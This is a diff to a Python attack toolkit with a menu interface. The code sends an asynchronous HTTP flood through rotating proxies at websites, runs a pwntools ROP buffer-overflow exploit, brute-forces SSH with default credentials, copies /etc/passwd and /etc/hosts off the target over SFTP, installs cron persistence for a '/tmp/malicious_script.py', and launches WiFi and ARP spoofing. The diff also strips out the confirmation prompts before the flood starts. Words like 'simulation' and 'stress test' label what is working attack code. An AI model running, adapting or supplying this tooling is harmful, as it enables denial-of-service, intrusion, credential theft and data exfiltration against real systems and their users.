@@ -5,13 +5,13 @@ import aiohttp
 import asyncio
 import random
 import subprocess
-from googlesearch import search
 import shutil
 import os
 import paramiko
 import platform
 from pwn import *
 from bs4 import BeautifulSoup
+from googlesearch import search
 
 # List of high-traffic websites for testing
 default_urls = [
@@ -36,15 +36,15 @@ proxies = [
     {"http": "http://your-second-proxy-ip:port", "https": "http://your-second-proxy-ip:port"}
 ]
 
-# Function to get a random proxy from the list
+# Get random proxy
 def get_random_proxy():
     return random.choice(proxies)
 
-# Function to detect the operating system
+# Detect operating system
 def detect_os():
     return platform.system()
 
-# Web crawler function with proxy support
+# Web crawler function
 def web_crawler(start_url, max_depth=2):
     visited = set()
 
@@ -64,9 +64,10 @@ def web_crawler(start_url, max_depth=2):
 
     crawl(start_url, 0)
 
+# Fetch URLs asynchronously with aiohttp
 async def fetch(session, url, ip=None):
     headers = {'User-Agent': random.choice(default_user_agents)}
-    connector = aiohttp.TCPConnector(local_addr=(ip, 0)) if ip else None  # Bind to the IP if provided
+    connector = aiohttp.TCPConnector(local_addr=(ip, 0)) if ip else None
     proxy = get_random_proxy()
     while True:
         try:
@@ -77,6 +78,7 @@ async def fetch(session, url, ip=None):
             print(f"Error: {e}")
             await asyncio.sleep(random.uniform(0.5, 2))  # Rate limiting
 
+# Start flood for stress testing
 async def start_flood(url, ip=None):
     async with aiohttp.ClientSession() as session:
         tasks = []
@@ -85,6 +87,7 @@ async def start_flood(url, ip=None):
             tasks.append(task)
         await asyncio.gather(*tasks)
 
+# Network stress test
 def network_stress(ip=None, custom_urls=None):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
@@ -94,28 +97,22 @@ def network_stress(ip=None, custom_urls=None):
         tasks.append(loop.create_task(start_flood(url, ip)))
     loop.run_until_complete(asyncio.wait(tasks))
 
-# Enhanced Zero-Day Attack Simulation with Integrated Proxy Support
+# Enhanced Zero-Day Attack Simulation with Proxy Support
 def zero_attack(url_or_ip):
-    # Proxy for hiding IP
     proxy = get_random_proxy()
 
-    # Improved Buffer Overflow Attack Simulation
+    # Buffer overflow simulation
     try:
         print(f"Attempting buffer overflow on {url_or_ip} via proxy: {proxy}...")
-        
-        # Example vulnerable binary (replace with an actual vulnerable binary for testing)
-        binary_path = './vulnerable_binary'  
+        binary_path = './vulnerable_binary'  # Replace with actual vulnerable binary
         io = process(binary_path)
 
-        # ROP Chain to bypass protections like DEP and ASLR
         rop = ROP(binary_path)
         rop.call('system', [next(io.search(b'/bin/sh'))])
 
-        # Payload: Adjust the buffer size and ROP chain
-        payload = b'A' * 128  # Adjust this based on buffer size
-        payload += rop.chain()  # Chain the ROP exploit
+        payload = b'A' * 128  # Adjust the buffer size
+        payload += rop.chain()
 
-        # Send the payload
         io.sendline(payload)
         io.interactive()
 
@@ -123,13 +120,12 @@ def zero_attack(url_or_ip):
     except Exception as e:
         print(f"Buffer overflow attack failed on {url_or_ip}: {e}")
 
-    # SSH Brute Force with randomized traffic
+    # SSH brute force attack
     try:
         print(f"Attempting SSH brute force on {url_or_ip} via proxy: {proxy}...")
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-        # A list of common username/password combinations for brute force
         credentials = [('admin', 'admin'), ('root', 'root'), ('user', 'password')]
         for username, password in credentials:
             try:
@@ -140,12 +136,12 @@ def zero_attack(url_or_ip):
                 print(f"Failed to login with {username}:{password}")
         else:
             print(f"SSH brute force failed on {url_or_ip}")
-            return  # Exit if brute-force failed
+            return
 
         # Data Exfiltration Simulation
         print("Attempting data exfiltration...")
         sftp = client.open_sftp()
-        sensitive_files = ['/etc/passwd', '/etc/hosts']  # Example sensitive files
+        sensitive_files = ['/etc/passwd', '/etc/hosts']
         for file in sensitive_files:
             try:
                 sftp.get(file, f'./stolen_{os.path.basename(file)}')
@@ -154,7 +150,7 @@ def zero_attack(url_or_ip):
                 print(f"Failed to exfiltrate {file}: {e}")
         sftp.close()
 
-        # Persistence Mechanism (Linux Cron Job) - Directly from Python
+        # Persistence Mechanism
         print("Setting up persistence...")
         command = '(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/malicious_script.py") | crontab -'
         stdin, stdout, stderr = client.exec_command(command)
@@ -166,26 +162,17 @@ def zero_attack(url_or_ip):
     except Exception as e:
         print(f"Failed SSH attack or persistence mechanism on {url_or_ip}: {e}")
 
-    # Encrypted Communication (Simulated)
-    try:
-        print(f"Simulating encrypted communication with {url_or_ip} via proxy: {proxy}...")
-        subprocess.run(['openssl', 's_client', '-connect', f'{url_or_ip}:443'], capture_output=True)
-        print("Encrypted communication simulated successfully.")
-    except Exception as e:
-        print(f"Failed encrypted communication simulation: {e}")
-
-    print("Zero-day attack simulation complete.")
-
+# Simulate WiFi spoofing
 def wifi_spoofing():
-    # Example command for WiFi spoofing
     command = ["airbase-ng", "--essid", "Free_WiFi", "wlan0"]
     subprocess.run(command)
 
+# Simulate ARP spoofing
 def arp_spoofing(target_ip, spoof_ip):
-    # Example command for ARP spoofing
     command = ["arpspoof", "-t", target_ip, spoof_ip]
     subprocess.run(command)
 
+# Scrape Chinese textbooks
 def scrape_chinese_textbooks(query):
     results = search(query, num_results=10, lang="zh")
     return results
@@ -195,7 +182,7 @@ def display_books(books):
         print(f"Link: {book}")
         print("-" * 20)
 
-# Main User Interface
+# Main user interface
 def display_ui():
     while True:
         print("""
@@ -220,17 +207,11 @@ def display_ui():
         """)
 
         choice = input("Select the method (1-11): ").strip()
-        ip_address = None
 
         if choice == "1":
-            print("Selected Ethernet-based Desktop")
             ip_address = input("Enter the IP address: ").strip()
-            proceed = input("Proceed with Ethernet stress test? (1 for Yes, 2 for No): ").strip()
-            if proceed == "1":
-                print("Starting Ethernet-based stress test...")
-                network_stress(ip_address)
-            else:
-                continue
+            print("Starting Ethernet-based stress test...")
+            network_stress(ip_address)
         elif choice == "2":
             url_or_ip = input("Enter the URL or IP address to use: ").strip()
             zero_attack(url_or_ip)
@@ -256,12 +237,8 @@ def display_ui():
             display_books(books)
         elif choice == "8":
             custom_url = input("Enter the URL to stress test: ").strip()
-            proceed = input("Proceed with stress test on the custom URL? (1 for Yes, 2 for No): ").strip()
-            if proceed == "1":
-                print("Starting stress test on the custom URL...")
-                network_stress(custom_urls=[custom_url])
-            else:
-                continue
+            print("Starting stress test on the custom URL...")
+            network_stress(custom_urls=[custom_url])
         elif choice == "9":
             start_url = input("Enter the start URL for web crawling: ").strip()
             max_depth = int(input("Enter the maximum depth for web crawling: ").strip())
@@ -275,7 +252,7 @@ def display_ui():
             break
         else:
             print("Invalid option selected.")
-        
+
         input("Press Enter to return to the menu...")
 
 if __name__ == "__main__":
